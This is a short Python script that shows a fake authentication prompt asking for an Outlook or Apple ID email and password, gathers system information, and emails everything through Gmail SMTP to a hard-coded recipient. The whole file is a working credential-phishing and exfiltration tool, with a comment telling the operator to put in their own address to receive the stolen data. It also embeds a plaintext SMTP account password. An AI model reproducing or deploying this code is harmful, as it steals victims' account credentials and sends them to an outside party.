# This program asks the user for their email address and password and stores the information
# It gathers the system name, node, release, version, machine, and processor.
# It sends all the information gathered via email to the email address in the variable 'receiver'

# Import modules
import platform
import smtplib
import sys
import time

info = platform.uname() # Gathers the system information

# Ask the user for the email address and password and stores them
print('''This process requires user authentication. Please enter the
email address (ie. Outlook address on Windows, Apple ID on Mac)
and password for this account on the system.\nWARNING: Password may be echoed!\n''')
systemUser = str(input("Email address: "))
systemPassword = str(input("Password: "))

# Variables for sending the email
SENDER = 'python.test.machine@gmail.com'
receiver = 'moke2018@macduffie.org' # Change this to your email address so the information is sent to you
message = '''
To: ''' + receiver + '''
From: ''' + SENDER + '''

''' + str(platform.uname()) + '''

System username: ''' + systemUser + '''
System password: ''' + systemPassword

# Setting up the server
SERVER = smtplib.SMTP('smtp.gmail.com:587')
user = 'python.test.machine@gmail.com'
password = 'PythonIsGreat123'

# Sending the mail
SERVER.ehlo()
SERVER.starttls()
SERVER.login(user,password)
SERVER.sendmail(SENDER, receiver, message)
SERVER.quit()

# Ending the program
print("\nProcess complete.")
time.sleep(1)
sys.exit(0)
